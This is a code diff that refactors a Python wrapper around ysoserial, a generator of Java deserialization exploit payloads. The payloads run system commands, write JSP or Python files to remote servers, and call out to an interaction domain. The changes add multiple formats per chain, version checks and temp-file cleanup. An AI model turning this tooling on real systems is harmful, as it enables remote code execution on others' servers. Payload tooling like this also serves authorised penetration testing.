@@ -51,7 +51,7 @@ class YSOSerial(Serializer):
         logging.debug("Checking java binary version")
         binBackup = self.bin
         self.bin = self.javaPath
-        versionOut = self.exec('-version', rawResult=True).stderr.decode("ascii").split('\n')
+        versionOut = self.exec('-version 2>&1').split('\n')
         self.bin = binBackup
         pattern = r"version\s+\"(?P<version>[0-9]+)\."
         regex = re.compile(pattern)
@@ -60,8 +60,9 @@ class YSOSerial(Serializer):
             if match:
                 self.javaVersion = int(match.groupdict()['version'])
                 break
-        if self.javaVersion < 8 or self.javaVersion > 11:
-            logging.warning(f"Java version is not >= 8 or <= 11. Version detected: {self.javaVersion}. You might having errors generating payloads.")
+        if self.javaVersion > 11:
+            logging.warning(f"Java version is not <= 11, version detected: {self.javaVersion}.")
+            logging.warning("You might having errors generating payloads.")
             logging.warning("It is recommended to install it and use it with --java-path option or use Docker container")
             logging.debug('\n'.join(versionOut))
         return True
@@ -82,22 +83,23 @@ class YSOSerial(Serializer):
                 continue
 
             if chain['name'] in self.specialPayloadFormats:
-                for format in self.specialPayloadFormats[chain['name']]:
-                    chains.append({
-                        'id': chain['name'].lower(),
-                        'name': chain['name'],
-                        'format': format,
-                    })
+                formats = self.specialPayloadFormats[chain['name']]
             else:
-                chains.append({
-                    'id': chain['name'].lower(),
-                    'name': chain['name'],
-                    'format': '<system_command>',
-                })
+                formats = ['<system_command>']
+            
+            chains.append({
+                'id': chain['name'].lower(),
+                'name': chain['name'],
+                'description': f"{chain['name']} {' | '.join(formats)}",
+                'formats': formats,
+            })
             
         return chains
 
     def generate(self, chains, output):
+
+        if len(chains) == 0:
+            return 0
 
         system_command = self.chainOpts.system_command
         interact_domain = self.chainOpts.interact_domain
@@ -115,15 +117,17 @@ class YSOSerial(Serializer):
             java_remote_class_url = self.chainOpts.java_remote_class_url.replace('%%domain%%', interact_domain)
 
         logging.info(f"System command: {system_command}")
-        logging.info(f"JSP Code: {jsp_code}")
-        logging.info(f"Python Code: {py_code}")
+        logging.info(f"JSP Code: {self.chainOpts.jsp_code}")
+        logging.info(f"Python Code: {self.chainOpts.py_code}")
         logging.info(f"File written on remote server: {remote_file}")
         logging.info(f"Content written on server: {remote_content}")
         logging.info(f"Interact domain: {interact_domain}")
 
         # create an empty file that will contain JSP and Python file with the payload
-        fp = self.createTemporaryFile()
-        pyFp = self.createTemporaryFile()
+        fp = self.createTemporaryFile(suffix='.jsp')
+        pyFp = self.createTemporaryFile(suffix='.py')
+        if fp == None or pyFp == None:
+            return 0
 
         logging.info(f"Generating payloads...")
         
@@ -132,81 +136,92 @@ class YSOSerial(Serializer):
         count = 0
         for chain in chains:
 
-            format = chain['format']
+            for format in chain['formats']:
 
-            if chain['name'] in self.maxVersionRequired and self.javaVersion > self.maxVersionRequired[chain['name']]:
-                logging.warning(f"[{chain['name']}] Skipping payload with because it requires Java version <= {self.maxVersionRequired[chain['name']]}")
-                continue
+                if chain['name'] in self.maxVersionRequired and self.javaVersion > self.maxVersionRequired[chain['name']]:
+                    logging.warning(f"[{chain['name']}] Skipping payload with because it requires Java version <= {self.maxVersionRequired[chain['name']]}")
+                    continue
 
-            if ('<url>' in format or '<domain>' in format) and not interact_domain:
-                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
-                continue
-            if '<remote_url>' in format and not java_remote_class_url:
-                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires a java remote URL")
-                continue
+                if ('<url>' in format or '<domain>' in format) and not interact_domain:
+                    logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
+                    continue
+                if '<remote_url>' in format and not java_remote_class_url:
+                    logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires a java remote URL")
+                    continue
 
-            logging.info(f"[{chain['name']}] Generating payload with format '{format}'")
+                logging.info(f"[{chain['name']}] Generating payload with format '{format}'")
 
 
-            chain_system_command = system_command
-            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
-            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
-            escaped_chain_system_command = chain_system_command.replace("'", "\\'")
+                chain_system_command = system_command
+                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
+                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
+                escaped_chain_system_command = chain_system_command.replace("'", "\\'")
 
-            chain_jsp_code = jsp_code
-            chain_jsp_code = chain_jsp_code.replace('%%system_command%%', escaped_chain_system_command)
-            chain_jsp_code = chain_jsp_code.replace('%%domain%%', str(interact_domain))
-            chain_jsp_code = chain_jsp_code.replace('%%chain_id%%', chain['id'])
+                chain_jsp_code = jsp_code
+                chain_jsp_code = chain_jsp_code.replace('%%system_command%%', escaped_chain_system_command)
+                chain_jsp_code = chain_jsp_code.replace('%%domain%%', str(interact_domain))
+                chain_jsp_code = chain_jsp_code.replace('%%chain_id%%', chain['id'])
 
-            chain_remote_content = remote_content
-            chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
-            chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
-            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])
+                chain_remote_content = remote_content
+                chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
+                chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
+                chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])
 
-            chain_py_code = py_code
-            chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
-            chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
-            chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])
+                chain_py_code = py_code
+                chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
+                chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
+                chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])
 
-            chainArguments = format
-            chainArguments = chainArguments.replace('<base64>', base64.b64encode(chain_remote_content.encode('ascii')).decode('ascii'))
-            chainArguments = chainArguments.replace('<local_file>', fp.name)
-            chainArguments = chainArguments.replace('<system_command>', chain_system_command)
-            chainArguments = chainArguments.replace('<local_py_file>', pyFp.name)
-            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'jsp'))
-            chainArguments = chainArguments.replace('<remote_py_file>', remote_file.replace('%%ext%%', 'py'))
-            chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
-            chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
-            chainArguments = chainArguments.replace('<classname>', java_classname)
-            chainArguments = chainArguments.replace('<domain>', str(interact_domain))
-            chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
-            chainArguments = chainArguments.replace('<remote_url>', str(java_remote_class_url).replace('%%chain_id%%', chain['id']))
-            
-            with open(fp.name, mode='w') as ft:
-                ft.write(chain_jsp_code)
+                chainArguments = format
+                chainArguments = chainArguments.replace('<base64>', base64.b64encode(chain_remote_content.encode('ascii')).decode('ascii'))
+                chainArguments = chainArguments.replace('<local_file>', fp.name)
+                chainArguments = chainArguments.replace('<system_command>', chain_system_command)
+                chainArguments = chainArguments.replace('<local_py_file>', pyFp.name)
+                chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'jsp'))
+                chainArguments = chainArguments.replace('<remote_py_file>', remote_file.replace('%%ext%%', 'py'))
+                chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
+                chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
+                chainArguments = chainArguments.replace('<classname>', java_classname)
+                chainArguments = chainArguments.replace('<domain>', str(interact_domain))
+                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
+                chainArguments = chainArguments.replace('<remote_url>', str(java_remote_class_url).replace('%%chain_id%%', chain['id']))
+                
+                with open(fp.name, mode='w') as ft:
+                    ft.write(chain_jsp_code)
 
-            with open(pyFp.name, mode='w') as ft:
-                ft.write(chain_py_code)
+                with open(pyFp.name, mode='w') as ft:
+                    ft.write(chain_py_code)
 
-            chainArguments = f"'{chainArguments}'"
-            result = self.payload(chain['name'], chainArguments)
+                chainArguments = f"'{chainArguments}'"
+                result = self.payload(chain['name'], chainArguments)
 
-            if result.returncode != 0:
-                logging.error(f"[{chain['name']}] Failed to create payload")
-                logging.error(result.stderr.decode('ascii'))
-                continue
+                if result.returncode != 0:
+                    logging.error(f"[{chain['name']}] Failed to create payload")
+                    if result.stderr != b'':
+                        logging.error(result.stderr.decode('ascii'))
+                    if result.stdout != b'':
+                        logging.error(result.stdout.decode('ascii'))
+                    continue
 
-            payload = result.stdout
+                payload = result.stdout
 
-            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")
+                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")
 
-            if self.chainOpts.base64:
-                payload = base64.b64encode(payload)
-            
-            if self.chainOpts.url:
-                payload = urllib.parse.quote_plus(payload).encode('ascii')
-            
-            output.write(payload+b"\n")
-            count = count + 1
+                if self.chainOpts.base64:
+                    payload = base64.b64encode(payload)
+                
+                if self.chainOpts.url:
+                    payload = urllib.parse.quote_plus(payload).encode('ascii')
+                
+                output.write(payload+b"\n")
+                count = count + 1
+
+        # cleanup temp file
+        if os.path.exists(fp.name):
+            logging.debug(f"Removing temporary file {fp.name}")
+            os.remove(fp.name)
+        if os.path.exists(pyFp.name):
+            logging.debug(f"Removing temporary file {pyFp.name}")
+            os.remove(pyFp.name)
                 
         return count
